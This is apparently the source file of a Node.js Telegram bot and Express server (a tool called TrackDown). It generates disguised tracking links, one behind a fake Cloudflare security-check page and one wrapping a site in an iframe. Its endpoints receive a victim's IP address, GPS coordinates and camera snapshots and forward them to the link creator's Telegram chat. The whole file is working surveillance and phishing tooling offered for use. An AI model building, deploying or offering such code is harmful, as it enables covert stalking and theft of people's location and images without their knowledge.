require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Buffer } = require('buffer');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');

// Environment Configuration
const PORT = process.env.PORT || 5000;
const HOST_URL = process.env.HOST_URL || 'http://localhost:5000';
const USE_1PT = process.env.USE_1PT === 'true';
const BOT_TOKEN = process.env.BOT_TOKEN;

if (!BOT_TOKEN) {
  console.error('Missing BOT_TOKEN in environment variables');
  process.exit(1);
}

// Initialize Express
const app = express();
app.use(express.json({ limit: '20mb' }));
app.use(express.urlencoded({ extended: true, limit: '20mb' }));
app.use(cors());
app.set('view engine', 'ejs');

// Initialize Telegram Bot
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// Middleware
const requestDataMiddleware = (req, res, next) => {
  req.clientIp = req.headers['x-forwarded-for']?.split(',')[0].trim() || 
               req.connection?.remoteAddress || 
               req.ip;
  req.requestTime = new Date().toISOString().slice(0, 19).replace('T', ':');
  next();
};

// Route Handlers
const handleTrackingRoute = (template) => (req, res) => {
  const { path: uid, uri } = req.params;
  
  if (!uid || !uri) {
    return res.redirect('https://t.me/th30neand0nly0ne');
  }

  try {
    const decodedUrl = Buffer.from(uri, 'base64').toString('utf-8');
    res.render(template, {
      ip: req.clientIp,
      time: req.requestTime,
      url: decodedUrl,
      uid,
      a: HOST_URL,
      t: USE_1PT
    });
  } catch (error) {
    console.error('URL Decoding Error:', error);
    res.status(400).send('Invalid URL parameter');
  }
};

// Routes
app.get('/w/:path/:uri', requestDataMiddleware, handleTrackingRoute('webview'));
app.get('/c/:path/:uri', requestDataMiddleware, handleTrackingRoute('cloudflare'));

// Bot Command Handlers
const handleStartCommand = (chatId, firstName) => {
  const markup = {
    inline_keyboard: [[{ text: 'Create Link', callback_data: 'crenew' }]]
  };

  bot.sendMessage(
    chatId,
    `👋 Welcome ${firstName}!\n` +
    'I can help you create tracking links to gather information from users.\n\n' +
    '• Use /create to start\n' +
    '• Use /help for instructions',
    { reply_markup: JSON.stringify(markup) }
  );
};

const handleHelpCommand = (chatId) => {
  const helpText = `
📚 **Available Commands**
/create - Generate new tracking links
/help - Show this help message

🔗 **Link Types**
1. Cloudflare Link - Displays security check page
2. Webview Link - Embeds content in iframe

⚠️ Note: Some websites block iframe embedding

🌐 GitHub Repository:
https://github.com/Th30neAnd0nly/TrackDown`;

  bot.sendMessage(chatId, helpText, { parse_mode: 'Markdown' });
};

// URL Validation
const isValidUrl = (url) => {
  try {
    new URL(url);
    return url.startsWith('http');
  } catch {
    return false;
  }
};

// Link Generation
const generateLinks = async (chatId, url) => {
  const path = `${chatId.toString(36)}/${Buffer.from(url).toString('base64')}`;
  const links = {
    cloudflare: `${HOST_URL}/c/${path}`,
    webview: `${HOST_URL}/w/${path}`
  };

  if (USE_1PT) {
    try {
      const [cloud, web] = await Promise.all([
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(links.cloudflare)}`),
        fetch(`https://short-link-api.vercel.app/?query=${encodeURIComponent(links.webview)}`)
      ]);
      links.cloudflare = (await cloud.json()).shortenedUrl;
      links.webview = (await web.json()).shortenedUrl;
    } catch (error) {
      console.error('URL Shortening Error:', error);
    }
  }

  return links;
};

// Bot Event Handlers
bot.on('message', async (msg) => {
  const { chat: { id: chatId }, text, reply_to_message } = msg;

  // Handle URL responses
  if (reply_to_message?.text === '🌐 Enter Your URL') {
    if (!isValidUrl(text)) {
      await bot.sendMessage(chatId, '❌ Invalid URL. Please include http:// or https://');
      return bot.sendMessage(chatId, '🌐 Enter Your URL', { reply_markup: { force_reply: true } });
    }

    try {
      const { cloudflare, webview } = await generateLinks(chatId, text);
      const response = `✅ Links Created!\n\n🔒 Cloudflare:\n${cloudflare}\n\n🌐 Webview:\n${webview}`;
      
      bot.sendMessage(chatId, response, {
        reply_markup: JSON.stringify({
          inline_keyboard: [[{ text: 'Create New', callback_data: 'crenew' }]]
        })
      });
    } catch (error) {
      console.error('Link Generation Error:', error);
      bot.sendMessage(chatId, '⚠️ Error generating links. Please try again.');
    }
    return;
  }

  // Handle commands
  switch (text) {
    case '/start':
      handleStartCommand(chatId, msg.chat.first_name);
      break;
    case '/create':
      bot.sendMessage(chatId, '🌐 Enter Your URL', { reply_markup: { force_reply: true } });
      break;
    case '/help':
      handleHelpCommand(chatId);
      break;
  }
});

bot.on('callback_query', async (query) => {
  if (query.data === 'crenew') {
    await bot.answerCallbackQuery(query.id);
    bot.sendMessage(query.message.chat.id, '🌐 Enter Your URL', { reply_markup: { force_reply: true } });
  }
});

bot.on('polling_error', (error) => {
  console.error('Telegram Bot Error:', error);
});

// API Endpoints
app.post('/location', (req, res) => {
  const { lat, lon, uid, acc } = req.body;
  
  if (!lat || !lon || !uid || !acc) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  try {
    const decodedUid = parseInt(uid, 36);
    bot.sendLocation(decodedUid, lat, lon);
    bot.sendMessage(decodedUid, `📍 Location Received\nLat: ${lat}\nLon: ${lon}\nAccuracy: ${acc}m`);
    res.status(200).send('OK');
  } catch (error) {
    console.error('Location Error:', error);
    res.status(500).json({ error: 'Failed to process location' });
  }
});

app.post('/camsnap', (req, res) => {
  const { uid, img } = req.body;
  
  if (!uid || !img) {
    return res.status(400).json({ error: 'Missing parameters' });
  }

  try {
    const imageBuffer = Buffer.from(img, 'base64');
    bot.sendPhoto(parseInt(uid, 36), imageBuffer, {}, {
      filename: 'snapshot.png',
      contentType: 'image/png'
    });
    res.status(200).send('OK');
  } catch (error) {
    console.error('Camera Snap Error:', error);
    res.status(500).json({ error: 'Failed to process image' });
  }
});

app.get('/', requestDataMiddleware, (req, res) => {
  res.json({ ip: req.clientIp });
});

// Server Startup
app.listen(PORT, () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`🌍 Host URL: ${HOST_URL}`);
  console.log(`🔗 1pt.in Shortener: ${USE_1PT ? 'Enabled' : 'Disabled'}`);
});